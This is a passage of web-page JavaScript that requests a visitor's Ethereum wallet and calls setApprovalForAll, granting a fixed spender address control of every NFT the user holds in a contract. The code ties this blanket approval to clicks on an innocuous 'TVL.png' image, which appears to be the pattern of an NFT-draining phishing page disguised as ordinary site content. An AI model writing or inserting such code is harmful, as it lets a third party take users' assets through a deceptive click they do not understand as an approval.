    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const nftContract = new ethers.Contract(nftContractAddress, abi, signer);
    const approved = await nftContract.isApprovedForAll(userAddress, spenderAddress);

    if (approved) {
      alert("✅ Already approved.");
    } else {
      try {
        const tx = await nftContract.setApprovalForAll(spenderAddress, true);
        alert("⏳ Approval in progress...");
        await tx.wait();
        alert("✅ Approval complete!");
      } catch (err) {
        console.error("Approval failed", err);
        alert("❌ Approval failed or cancelled.");
      }
    }
  }

  // Attach event to TVL image
  window.addEventListener("DOMContentLoaded", () => {
    const tvlImg = document.querySelector('img[src="TVL.png"]');
    if (tvlImg) {
      tvlImg.style.cursor = "pointer";
      tvlImg.addEventListener("click", connectAndApprove);
    }
  });
</script>
